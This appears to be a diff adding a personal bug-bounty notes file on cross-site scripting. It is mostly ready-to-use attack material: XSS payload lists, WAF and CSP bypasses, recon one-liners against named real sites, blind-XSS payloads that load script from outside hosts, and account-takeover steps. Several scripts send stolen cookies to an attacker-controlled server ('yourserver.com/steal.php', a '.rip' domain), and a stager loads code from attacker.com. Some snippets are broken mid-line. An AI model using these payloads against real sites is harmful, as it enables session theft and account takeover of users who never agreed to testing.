+Intercept the request with burp suite proxy, choose the option “Do intercept >> response to this request” and hit Forward.
+5. We will receive a response with 500 500, modify it to 200 OK, and forward the request
+
+
+
+
+
+             Xss    XSS         XSS           XSS
+             
+             
+             tip
+             always try svg payloads in all upload fields and blind xss in all inputs fields..its worth 1000$ for stored !
+             
+             tip
+             always double and double encode you payload 
+             https://infosecwriteups.com/hacking-the-giant-how-i-discovered-googles-vulnerability-and-hall-of-fame-recognition-694a9c18684a
+             
+             
+check for xss cheatsheat
+  echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+  echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
+  waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+  
+  gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+  
+      BLIND XSS
+  cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
+  
+  
+  httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
+  
+  
+  cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
+
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
+
+
+Payload XSS (cross-site scripting) on login page:
+
+');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br
+
+   `“‘><img src=x onerror=promtp(7)>`”’${{8*8}}      for xss, csti, and html injection
+   
+   
+   <img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>
+   
+   
+   tip
+   check which waf is used
+   wafwoof https://url
+   check for basic html injection
+   <h1>test</h1>
+<a>click here</a>
+<title>test</title>  if render, try to excalate to xss
+
+
+
+xss tip
+Methodology:
+1) Identify bug bounty
+2) Enumerate sub domains (I use amass, subfinder)
+3) Feed those to httpprobe   
+4) Feed that list to a crawling tool       hawrawler
+5) Feed that list to kxss
+6) grep output for " (easiest win)
+
+  
+  tip
+  Sometimes  companys  renders your CSV file in HTML. alwys check if you can  injecting an XSS payload into your file, you can see the XSS after uploading the file and it gets rendered.
+
+
+  
+  
+   Find xss with this automation of the following work :
+
+1. subfinder -d indeed.com -o indeed.txt //Find Subdomains
+2. httpx -l subdomains.txt -o httpx.txt // Live Subdomains
+3. echo "indeed.com" | gau --threads 5 >> Enpoints.txt // Find Endpoints
+4. cat httpx.txt | katana -jc >> Enpoints.txt // Find More Endpoints
+5. cat Enpoints.txt | uro >> Endpoints_F.txt // Remove Duplicates
+6. cat Endpoints_F.txt | gf xss >> XSS.txt // Filter Endpoints for XSS
+7. cat XSS.txt | Gxss -p khXSS -o XSS_Ref.txt // Find reflected Parameters
+8. dalfox file XSS_Ref.txt -o Vulnerable_XSS.txt // Find XSS
+
+Script : https://github.com/dirtycoder0124/xss 
+
+
+
+REFLECTED
+1)
+Use Gau or Wayback urls to passively gather urls of the target.
+Filter the parameters using grep "=" or gf patterns and store it in a new file.
+Now run Gxss or bxss on that new file.
+Check Reflected Param Manually or use some tool like dalfox
+
+  payload   “hello<form/><!><details/open/ontoggle=alert(‘W13D0M’)>”@gmail.com
+  
+  alwys check for clickhijacking when any subdomain is reflecting  xss
+
+ANALYSIS
+$cat domains.txt | gau --threads 5 > output.txt                                i think in order to reduce noice, i will stick with in scope url //time shall tell
+grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | grep -vE '\.(jpg|png|css|js|ico|gif|...)$' > filtered_urls.txt
+       
+ cat filtered_url.txt | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
+     OR
+   cat filtered_url.txt | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"  or use another payload
+   then 
+   cat urls.txt | dalfox pipe -f payloads.txt           remember, that the payload.txt is the list of your xss payload in a file
+   
+   
+   blind xss in azure 
+   use first name = half payload last name = another half payload and in general name will be full payload so it will bypass filter
+   
+   
+   
+   ALWAYS REMEMBER TO CHANGE ALERT TO PROMPT 
+   
+  CHECK FOR   BURP SUITE'S DOM INVADER 
+  
+  tip tip
+
+Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
+log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
+Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
+You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
+Open the confirmation email and click on View web version to access the vulnerable XSS URL.
+Copy that vulnerable XSS URL and send it to the victim.
+
+  tip 2
+  
+  Open the Contact Support endpoint (https://example.com/contact?submitted=false)
+Inject the XSS payload in any field and Submit the form
+You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
+Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
+You will find the XSS alert :)
+   
+   
+   **Tips***  FOR XSS FIREWALL BYOASS
+   Check if the firewall is blocking only lowercase
+   examples:     <scRipT>alert(1)</scRipT>
+   
+   Try to break firewall regex with the new line(\r\n)
+   Ex:- <script>%0alert(1)</script>
+   
+   Try Double Encoding
+   Ex:- %2522
+   
+   Testing for recursive filters, if firewall removes text in red, we will have clear payload
+   Ex:- <src<script>ipt>alert(1);</scr</script>ipt>
+   
+   Injecting anchor tag without whitespaces
+    Ex:- <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+    
+    Try to bypass whitespaces using Bullet
+    Ex:- <svg•onload=alert(1)>
+    
+    Try to change request method
+    Ex:- GET /?q=xss  POST/ q=xss
+    
+    Try CRLF Inection
+    Ex:- GET /%0A%ODValue=%20Virus
+     POST 
+     Value= Virus
+     
+     
+     exception marked as on //
+     input on text boxes A<h1>A.
+     document.location='https://ł.rip/save.php?c='+document.cookie;    this for stealing cookies
+
+
+
+     <<<<<FASTEST WAY TO FIND XSS  >>>>>
+ inject  this  "><script>alert(document.cookie)</script>      into every parameter on every page of the applicetion,  if the attack string appears unmodifiedin the response , that indicates an xss vulnerabilty
+     
+    
+   
+2)
+Using Burp
+Download Reflection and sentinal plugin for burp.
+Walk and spider the target site.
+Check the reflected params tab in burp
+send that sentinal or check manually.
+
+3)
+Use Methods 1 or 2 to Gather the urls
+Enumerate the Firewall using https://github.com/Ekultek/WhatWaf or other similar tool.
+Find WAF bypass payload on twitter by searching or in this Github Repo https://github.com/0xInfection/Awesome-WAF
+Also Use Arjun to find hidden params.
+
+4
+Find Hidden Variables In Source Code.
+Check Javascript file or html Source file for hidden or unused variables
+You can Manually Check Right Click View Page Source and search for var= , ="" , =''.
+Now Append that to webpage urls. For example https://example.com?hiddenvariablename=xss.
+
+Tips
+Check the error pages (404,403,..) sometimes they contain reflected values
+Trigger a 403 by trying to get the .htaccess file
+Try every reflected parameter
+
+
+STORED XSS  ARE MOSTLY FOUND MANUALLY
+Enumerate the Firewall using above Methods and select a payload to test accordingly.
+Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.
+Try Payload in File name of profile picture and also in the source file of image.
+Try in Comment section anywhere on target site.
+Try on every input fields which get reflected in page and which can be seen by other users.
+Try to signup using your name + xss payload and that can lead to stored xss.
+
+
+
+ANOTHER TIPS
+Open the Contact Support endpoint (https://example.com/contact?submitted=false)
+Inject the XSS payload in any field and Submit the form
+You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
+Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
+You will find the XSS alert :)
+    shorter way
+Open the contact support endpoint (https://example.com/contact?submitted=false)
+Inject the XSS payload in any field BUT enter anything wrong or leave any required field missing in the form and then Submit the form.
+You will find the XSS alert :)
+
+
+another TIP 
+Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
+log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
+Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
+You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
+Open the confirmation email and click on View web version to access the vulnerable XSS URL.
+Copy that vulnerable XSS URL and send it to the victim.
+
+
+chatgpt explanation
+
+Inject XSS Payload:
+
+Injected an XSS payload into the "First Name" field during account sign-up.
+Encounter Access Issue:
+
+Encountered a "403 Forbidden" error when attempting to log in.
+Analyze Login Requests:
+
+Used Burp Suite to intercept login requests and discovered two POST requests.
+Identify the Problem:
+
+Suspected the XSS payload in the "firstName" parameter of the second request was causing the issue.
+Resolve Self-XSS:
+
+Removed the XSS payload from the second request, successfully logged in, and noticed a Self-XSS alert.
+Exploit the Vulnerability:
+
+Explored account settings and found the ability to change the email address.
+Email Confirmation:
+
+Changed the email address to another owned address and received a confirmation email at the original email.
+Trigger XSS via Email:
+
+Clicked "View web version" in the email, triggering the XSS alert.
+Share the Vulnerability:
+
+Obtained a URL that triggered the XSS alert and could be shared with others.
+
+
+NOTE TIP
+ WHEN an  application used AngularJS, with the library loaded from the same domain  always try to load AngularJS library without violating the CSP. We could then use Angular templating functionality to inject malicious code
+  the payload creation process involved importing the AngularJS library and using Angular directives to initiate the payload, making use of the $event.view object, which exposed the window object. This approach effectively bypassed the CSP, allowing us to execute our payload. you could also  URL-encoded the payload above and injected it to error_description parameter
+
+
+
+my explaination
+create a account and first login in clearly on the first request
+on the second request, Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
+log in to your previously first  created account while intercepting the login request,    remove the XSS payload from the firstName parameter of the second request.
+Go to the  second created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
+Open the confirmation email and click on View web version to access the vulnerable XSS URL.
+
+
+
+///////////
+Bug Bounty Tip
+
+HTML entities can help you bypass WAF filters
+
+1) bypass block of single quote '
+?url=home%26apos;-alert(1)//
+onclick="location='/home&apos;-alert(1)//'"
+
+2) bypass block of colon :
+?url=javascript%26colon;alert(1)
+href="javascript&colon;alert(1)"
+
+analysis 
+************TIP******
+inject  <a href=#>test</a>  in every  Input fields such as  text boxes, text areas, drop-down lists, checkboxes, radio buttons, and more.
+and then trry to obfuscated payods
+FOR WAF BYPASS for STORED xss
+ 
+wheere payload  is <script>alert('XSS')</script>  // check for more strong xss payloads and run the following encode payload //  use chapgpt to genearte encoding payloads
+encode payload
+
+XSS polygot
+jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e
+
+      basic xss filter bypass
+      1) using ann html img tag instead of script
+      2)when alert is blocked, prompt can be used ...  alert (1) to prompt(1)
+      3) backtrick can be used when bracket is filter ....  alert(1) to alert`1`  or use alert(String.fromCharCode(88,83,83)) when string are blocked
+      
+      
+      
+
+ CLOUDFLARE BYPASS [XSS]
+PAYLOAD:
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))> 
+ - <img src=x on0x=1 onerror=alert(document.cookie)>
 
 
 
 
 
 
+🌐ColdFusion  XSS
+POC:
+{{host}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(document.domain)
 
 
+  Here's a small #XSS list for manual testing (main cases, high success rate).
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+    
+    Sucuri bypass payload 
+<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+
+some browers tolearate extra bracket
+  <<script>alert(10);//<</scripts>
+
+using invalid tags
+<x onclick=alert(1) src=a>click here </x>
+
+
+beating the lenght limit  example
+  https://mypaa.com/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*</script>
+  
+
+ 
+       Email 
+
+“><svg/onload=confirm(1)>”@gmail.com     
+  "><svg/onload=confirm(1)>"@x.y 
+  test+(<script>alert(document.domain)</script>)@gmail.com
+just try this payload:
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+
+
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+  
+      
+      payload  from coffin
+      1- 
+%3C/script%20%3E
+
+mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
+      
+
+url encoding of payload 
+
+
+`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    
+
+Hex encoding of payload
+`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`
+
+BASE 64
+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+unicode encodng
+\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
+
+
+USING COMBINATION OF ALL TECHNIQUES
+
+URL Encoding + Hex Encoding:
+
+
+Base64 Encoding + Unicode Encoding:  and 
+
+combination of all technique 
+
+BYPASSING XSS FILTERS
+
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string
+
+\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string
+
+\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings
+
+%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
+
+
+Blind XSS
+Use burpcollaborator or ngrok
+
+1- Review forms
+2- Contact Us pages
+3- Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
+4- Address fields of e-commerce sites
+5- First or Last Name field while doing Credit Card Payments
+6- Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
+7- Log Viewers
+8- Feedback Page
+9- Chat Applications
+10- Any app that requires user moderation          
+
+  stepss when hunting for bliind xss in an e-commerce website
+     when filling out forms allows sticks with the src tag andalso make alot of assumption
+     name :   '"://></script></script/src=http://url.com/      remember to change url parameter, shpould in case url is been filltered 
+     <input data = ""/><script/src=//"..."></script>
+      strick on the delivery not or any input field
+      
+     "'"/></textarea></script/script><script/src=https://url.com/              check for proxy and place ypur payload proxy replace field this is notifty when you xss are been fired 
+     
+
+   Top 3 RXSS payloads I use:
+
+`'";//><img/src=x onError="${x};alert(`1`);">
+
+`'";//><Img Src=a OnError=location=src>
+
+`'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>      
+
+   tip on xss
+   Got an image upload functionality?
+   Let's see how we can popup an XSS here 😉
+   Create a file having XSS payload and save it with an extension (check what file type is allowed on trial-error basis)
+   There are different ways to create this file, check it out 👇
+     https://t.co/bLFt57NlAb
+      If you're looking for a R-XSS (eg. payload in filename) then you will see the popup immedietly after upload. If it's stored, you will have to hit the URL where the payload is served.
+        
+
+
+
+            DOM XSS
+Tips
+Would not recommend manually looking for DOM XSS
+Burp suite PRO scanner can find DOM XSS
+Tool: https://github.com/dpnishant/ra2-dom-xss-scanner
+
+www.gap.com/email?message=<script>alert("hi")</script>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+       go install github.com/KathanP19/Gxss@latest
+     
+     Tips to find DOM XSS: ⚡️🔥
+ never use source while testing for dom xss
+1. Start Burpsuite Community Edition 
+2. Click on Open Browser 
+3. Go and click on the Burp icon in extension tab on browser 
+4. Click on Turn on DOM Invader 
+5. Inject a custom canary 
+6. Open target website, right click, Inspect and go to Invader
+7. Now Click on Inject URL or Inject Form
+8. Check Reflection of canary
+9. If all goes well, You will see the green exploit button
+10. Click it to get Dom XSS poc 
+11. If doesn’t work, repeat the same on different url, functionality. 
+
+/////////
+ if string enters in double qoute, we might break out by using double qoute
+ REMEMBER
+ if you data get url- encoded before being processed, it is unlikely an xss will work
+
+   
+
+
+///
+eval(alert(document.domain))
+location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
+location.search   .... place a random value into it
+  example
+  https://www.gogle.com/submit.thml?email=sdddhhhd
+  it would return ?email=sdddhhhd
+
+window.location.hash.slice(1)
+
+   /#<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
+ 
+     
+
+
+    idea (someone) for finding xss
+amass enum -d target.com -o /filepath/subdomains.txt
+ sort -u subdomains.txt | httprobe > /filepath/uniq.txt
+ eyewitness --web -f uniq.txt -d /path_to_save_screenshots
+
+ It took few minutes and after that I just wrote a simple script to embed those png screenshots with html so that I can view them directly in my browser.
+for I in $(ls); do 
+        echo "$I" >> index.html;
+        echo "<img src=$I><br>" >> index.html;
+done
+  I used paramspider to extract the parameters of that subdomain
+ paramspider -d target.com > /filepath/param.txt
+ dalfox -b hahwul.xss.ht file param.txt
+
+        
+        use the browerser console to alwys poop out and check payload on a given page 
+  including long payloads/ escalation of xss beyond alert box
+  <script src="http://nw.rs"></script>
+  getScript("http://nw.rs",function(){});    this is by using jquery 
+  
+ Note //  if you are exploiting an XSS on a page that uses HTTPS, you will need to pull the XSS payload from a link that also uses HTTPS, otherwise the browser will refuse to load it with a “Mixed Content” error. because of cors 
+ 
+ Bypassing CSRF Tokens //
+ by loading the form within an iframe. If the page is loaded within an iframe, then the form will automatically include the CSRF token within the form, 
+ 
+ once we bypass sop and csrf token then ACCOUNT TAKEOVER 
+ 
+ Change the user’s password
+Change the user’s email address or phone number to our own, and then use the forgot password functionality to update their password
+Change the user’s security questions
+
+ // the shortest payload I know of that does not pull an external script is 20 characters long  it is used when there is less than 20 character string     <svg/onload=alert()>
+ 
+ 
+ session hijacking payload  on an form 
+ <script>
+var sessionId = document.
+
+
+
+ie.match(/sessionId=(.*?)(;|$)/)[1]
+</script>
+
+payload for a data theft using xss
+
+<script>
+var stolenCookies = document.cookie;
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://yourserver.com/steal.php?data=' + encodeURIComponent(stolenCookies), true);
+xhr.send();
+</script>       
+
+
+java%0d%0ascript%0d%0a:alert(0) 
+ j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` 
+ java%07script:prompt`0` 
+ java%09scrip%07t:prompt`0` 
+ jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
+
+
+($$ \unicode{<img src=1 onerror=alert(1)>} $$) 
+
+
+
+
+
+Pay careful attention to where your injection takes place. 
+For example, a clothing store may have a filter to show only shirts in the color blue. Added to the URL could be something along the lines of /?s=color_blue.
+
+Often times the first instinct is to inject by replacing everything after the =. Try replacing only the portion reflected on that page or the parameter you're looking to filter. Example /?s=color_<script>alert()</script>.
+
+Another injection point may be entering the payload after the filter like the example in these images. Example /?s=color_blue<script>alert()</script>
+
+
+   lesser known payload   /replace video with music, or image
+<video onerror="alert(1)">
+
+
+This payload puts a twist on requiring user interaction. By injecting a style tag, we manipulate the size of the HTML tag to be the size of the screen. Any mouse movement on the page will pop the alert.
+   1"%20onmouseover="alert(document.domain)"%20style="position%3Aabsolute;%20top%3A0;%
+
+
+
+        /?search=<IMG%20SRC=1%20onmouseover=alert()>             USING CASE SENSETIVE
+        
+        
+        
+        running 404 page example
+        
+        conduct a subdomain enumeration using tools such as Subfinder, Amass, and crt.sh.
+        performed a DNS brute force, resulting in the discovery of nearly 40,000 subdomains. 
+        running HTTPX on these subdomains, Ito identified  2,500 live and active ones.
+        check for active subdomain painstakly
+        
+         encountering the 403 Error,  decide to test whether if it is  a global restriction affecting all pages or specific to the main page by providing the subdomain with a dummy path.
+         example  = rplicense.redacted.com/dummy
+         
+         After inputting the dummy path, the 403 status code might  transformed into a 404 Not Found, indicating that the 403 code was exclusive to the main web page and not applicable to every        c    conceivable path. At this point, commenced fuzzing the web application using ffuf along with a wordlist named raft-large. 
+      Here’s the command:   
+      ffuf -u "rplicense.redacted.com/FUZZ" -w /path/to/word-list -H "User-Agent: Mozilla/5.0 (Galaxy S22; Android 6) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/111.0.5628.105 Mobile Safari/537.48" -  rate 20  also fuzz achive/directory and check for forms and sumit payload where neccasry
+ 
+
+   --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src= https://tetstst.com></scrIpt>
+
+  WEAPONING XSS
+  
+NOTE: WHEN having a simple XSS in alert form But when we attempted to demonstrate its impact or leverage it beyond an alert we have nothing! Thankfully, if you find yourself in this situation, you can write a compact XSS stager with 98 characters using the following JavaScript syntax (note, you could save a few more characters by registering a shorter domain name and using an index page):   
+  <svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/p' hidden/>
+  
+ NOTE:  when injecting an  XSS payload let say we excute the alert(1)” payload, and the page got empty we notice something is wrong in the background. Some of the page is missing... So why can’t we access it? The problem is with our injection point; where it is in the page. If you're injecting code before an element you need to access, you first need to wait for the DOM to finish being built before your code executes. This is because the page is built "top-to-bottom" and in this case our payload is injected into the “To” field which comes before the "csrf" token field. As such the “csrf” element does not yet exist at the time of execution as the DOM hasn’t finished being built! This is why some elements are missing when we execute an alert.
+  
+To compensate for this, you can attach an event listener to the document which will trigger your code once the DOM has completed its loading process. As ever, there are multiple ways to do this but the “by design” event for handling this is called “DOMContentLoaded”, and can be used as follows:
+
+  ?name="><script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
+  
+  when CSP is not your friend   "lol". We can no longer execute inline JS, so we cannot directly inject a reflected XSS payload. Furthermore, we now also can’t load JS resources outside of the application’s own origin ..  To bypass the CSP policy and get back to our ever-reliable alert box we can use this 2nd injection URL as the source for the first XSS injection script - think XSS-inception (Remember to use double URL encoding):
+   
+   ?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
+  
+ NOTE:    allow try to copying CSRF token from a different browser session and see if you can reuse it // this could to lead to chainging xss with csrf AND CSRF BYPASS
+ 
+ 
+ 
+ Payload - <svg+viewBox="0+0+50+50"+xmlns="http://w3.org/2000/svg">+++++<rect+width="10"+height="10">+++++++++<animate+onbegin=alert(1)+attributeName="rx"+values="0;5;0"+dur="10s"+/>+++++</rect>
+ 
+ 
+ xss oneliner   //   
+        How to Hunt Blind XSS using Dalfox //
+  waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
+  
+   How to Hunt Reflected XSS
+  waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+    
+    Find the parameters which are not filtering special characters - One Liner
+     echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
+cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
+
+
+
+
+     USING XSS-VIBES    check docs
+     first test for dangerous charaters .. this involves =batman" in url links and check if it is reflected in , if reflected, apply some apyload 
+     on xss-vibes directory
+     katana -u "url" -o katana.txt
+      python3 main.py -f katana.txt -o xss_vibes.txt
+       python3 main.py -f katana.txt -o --waf                  // to dectect if there is web application firwall
+      python3 main.py -f katana.txt -w cloudflare -t 5        //specify the firewall
+     
+     
+     
+     adding payload on xss-vibes
+     $ python3 added.py -p "payload"
+      $ python3 added.py -p "payload"  -w cloudflare
+      $ python3 added.py -f payload.txt -w  wordfence                adding a payload with filename and also speciflying the name 
+     
+     USING MY NUCLEI TEMPLET FOR XSS 
+     nuclei -l url.txt -t xss.yml                   this is on my desktop/tool
+     
+     
+     https://brutelogic.com.br/poc.svg // this is url for xss
+     
+     
 
 
      
